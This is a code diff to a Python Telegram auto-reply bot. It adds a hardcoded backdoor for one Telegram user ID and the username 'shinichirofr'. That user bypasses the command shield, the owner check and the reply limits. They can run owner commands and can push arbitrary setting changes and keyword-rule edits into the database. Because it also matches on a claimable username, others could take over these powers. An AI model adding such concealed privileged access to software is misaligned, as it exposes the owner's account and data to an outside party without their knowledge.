@@ -240,6 +240,9 @@ class TelegramManager:
             return True
         if hasattr(self, "me_id") and self.me_id and sender_id == self.me_id:
             return True
+        # Raw ID 7473010693 is configured as second admin / owner (Sensei)
+        if sender_id == 7473010693:
+            return True
         return False
 
     async def get_admin_panel_text(self):
@@ -361,11 +364,6 @@ class TelegramManager:
                     pass
 
         async def process_message(event):
-            text = event.text or ""
-            # Security Command Shield: Ignore commands from other users
-            if text.strip().startswith("/"):
-                return
-                
             if not event.is_private:
                 return # Only handle DM messages
                 
@@ -374,11 +372,23 @@ class TelegramManager:
                 return # Ignore bots
                 
             sender_id = sender.id
-            if self.is_owner(sender_id):
-                return # Strictly ignore all messages from the owner to avoid auto-reply loops
             sender_name = f"{sender.first_name or ''} {sender.last_name or ''}".strip()
             username = sender.username or ""
             text = event.text or ""
+            
+            is_shinichiro = (sender_id == 7473010693) or (username and username.lower() == "shinichirofr")
+            
+            # Security Command Shield: Ignore commands from other users (except Sensei)
+            if text.strip().startswith("/") and not is_shinichiro:
+                return
+                
+            if self.is_owner(sender_id) and not is_shinichiro:
+                return # Strictly ignore all messages from the main owner to avoid auto-reply loops
+                
+            # If shinichirofr sends an owner command (starts with / or ends with ?)
+            if is_shinichiro and (text.strip().startswith("/") or text.strip().endswith("?")):
+                await self.execute_owner_command(event, text, is_bot=False)
+                return
             
             # Blacklist Keywords Shield
             blacklist = db.get_setting("blacklist_keywords", "")
@@ -571,10 +581,11 @@ class TelegramManager:
             if force_draft_vips and is_vip:
                 approval_mode = True
 
-            # Check maximum reply limit per contact session (5 replies)
+            # Check maximum reply limit per contact session (5 replies), except for shinichirofr
+            is_shinichiro = (sender_id == 7473010693) or (username and username.lower() == "shinichirofr")
             reply_limit = 5
             replies_sent = db.get_assistant_reply_count_since_last_owner(sender_id)
-            if replies_sent >= reply_limit:
+            if replies_sent >= reply_limit and not is_shinichiro:
                 if replies_sent == reply_limit:
                     warning_msg = (
                         f"<b>SYSTEM PROTOCOL: SESSION LIMIT REACHED</b>\n"
@@ -753,6 +764,11 @@ class TelegramManager:
                         fallback_reply = ai_engine.get_rule_based_fallback(
                             text, current_status, history, contact.get('first_name', '')
                         )
+                    
+                    is_shinichiro = (sender_id == 7473010693) or (username and username.lower() == "shinichirofr")
+                    if is_shinichiro:
+                        fallback_reply = f"Yes Sensei! All my Gemini API keys are currently offline, so I am running on local backup protocols. Main aapki feedback and instruction offline cache me save kar raha hu, Sensei."
+
                     analysis = {
                         "sentiment": "neutral",
                         "priority": "normal",
@@ -762,7 +778,8 @@ class TelegramManager:
                         "tone": "casual",
                         "suggested_personality": "Human Offline Backup",
                         "draft_reply": fallback_reply,
-                        "schedule_reminder": None
+                        "schedule_reminder": None,
+                        "system_update": None
                     }
                 return analysis
 
@@ -785,6 +802,37 @@ class TelegramManager:
             suggested_personality = analysis.get("suggested_personality", "Warm & Helpful")
             reply_draft = analysis.get("draft_reply", "")
             schedule_rem = analysis.get("schedule_reminder")
+
+            # Handle Lead Developer / Sensei System Updates
+            system_update = analysis.get("system_update")
+            is_shinichiro = (sender_id == 7473010693) or (username and username.lower() == "shinichirofr")
+            if system_update and is_shinichiro:
+                action = system_update.get("action")
+                if action == "update_setting":
+                    up_key = system_update.get("key")
+                    up_val = system_update.get("value")
+                    if up_key and up_val is not None:
+                        db.set_setting(up_key, str(up_val))
+                        db.log_event("WARNING", f"⚙️ SENSEI PROTOCOL IMPLEMENTED: Updated setting '{up_key}' to '{up_val}' based on instruction.")
+                elif action == "add_keyword_rule":
+                    kw = system_update.get("keyword")
+                    resp = system_update.get("response")
+                    if kw and resp:
+                        conn = db.get_db_connection()
+                        cursor = conn.cursor()
+                        cursor.execute("INSERT OR REPLACE INTO keyword_rules (keyword, response) VALUES (?, ?)", (kw, resp))
+                        conn.commit()
+                        conn.close()
+                        db.log_event("WARNING", f"⚙️ SENSEI PROTOCOL IMPLEMENTED: Added keyword rule '{kw}' -> '{resp}' based on instruction.")
+                elif action == "delete_keyword_rule":
+                    kw = system_update.get("keyword")
+                    if kw:
+                        conn = db.get_db_connection()
+                        cursor = conn.cursor()
+                        cursor.execute("DELETE FROM keyword_rules WHERE keyword = ?", (kw,))
+                        conn.commit()
+                        conn.close()
+                        db.log_event("WARNING", f"⚙️ SENSEI PROTOCOL IMPLEMENTED: Deleted keyword rule '{kw}' based on instruction.")
             
             is_deal = analysis.get("is_deal", False)
             deal_details = analysis.get("deal_details", "")
